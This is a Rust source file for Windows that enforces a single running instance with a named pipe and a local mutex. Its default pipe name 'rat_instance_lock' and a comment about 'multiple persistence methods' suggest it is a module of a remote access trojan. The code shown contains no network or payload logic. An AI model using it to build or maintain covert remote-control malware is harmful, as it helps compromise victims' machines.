extern crate winapi;

use winapi::um::{synchapi::CreateMutexW, handleapi::CloseHandle, errhandlingapi::GetLastError};
use std::{ptr, ffi::OsStr,os::windows::ffi::OsStrExt, process::exit};
use winapi::shared::{winerror::ERROR_ALREADY_EXISTS, ntdef::HANDLE};
use std::time::Duration;
use winapi::um::winbase::CreateNamedPipeW;
use winapi::um::winbase::{PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, PIPE_READMODE_BYTE, PIPE_WAIT};
use winapi::um::namedpipeapi::ConnectNamedPipe;

pub struct MutexLock {
    handle: HANDLE,
    mutex_enabled: bool,
    mutex_value: String,
}

impl MutexLock {
    pub fn new() -> Self {
        MutexLock {
            handle: ptr::null_mut(),
            mutex_enabled: false,
            mutex_value: String::new(),
        }
    }

    pub fn init(&mut self, mutex_enabled: bool, mutex_value: String) {
        self.mutex_enabled = mutex_enabled;
        self.mutex_value = mutex_value;

        // Use a local named pipe to ensure only one instance is running
        // even across multiple persistence methods.
        let pipe_name = format!(
            r"\\.\pipe\{}",
            if self.mutex_enabled {
                &self.mutex_value
            } else {
                "rat_instance_lock"
            }
        );

        // Try to connect to existing pipe
        if std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .open(&pipe_name)
            .is_ok()
        {
            exit(0);
        }

        // If not running, start a thread to keep the pipe open using synchronous winapi
        let pipe_name_wide = OsStr::new(&pipe_name)
            .encode_wide()
            .chain(Some(0))
            .collect::<Vec<u16>>();

        std::thread::spawn(move || {
            unsafe {
                let h_pipe = CreateNamedPipeW(
                    pipe_name_wide.as_ptr(),
                    PIPE_ACCESS_DUPLEX,
                    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                    1, // max instances
                    1024, 1024, 0, ptr::null_mut()
                );

                if !h_pipe.is_null() && h_pipe != winapi::um::handleapi::INVALID_HANDLE_VALUE {
                    loop {
                        ConnectNamedPipe(h_pipe, ptr::null_mut());
                        std::thread::sleep(Duration::from_secs(1));
                    }
                }
            }
        });

        self.lock();
    }

    pub fn lock(&mut self) {
        if !self.mutex_enabled {
            return;
        }

        let mutex = OsStr::new(&format!("Local\\{}", &self.mutex_value))
            .encode_wide()
            .chain(Some(0))
            .collect::<Vec<u16>>();

        unsafe {
            let mutex_handle = CreateMutexW(ptr::null_mut(), 1, mutex.as_ptr());

            if mutex_handle.is_null() {
                exit(0);
            }

            self.handle = mutex_handle;

            let last_error = GetLastError();
            if last_error == ERROR_ALREADY_EXISTS {
                CloseHandle(mutex_handle);
                exit(0);
            }
        }
    }

    pub fn unlock(&mut self) {
        if !self.mutex_enabled {
            return;
        }

        unsafe {
            CloseHandle(self.handle);
        }
    }
}

unsafe impl Send for MutexLock {}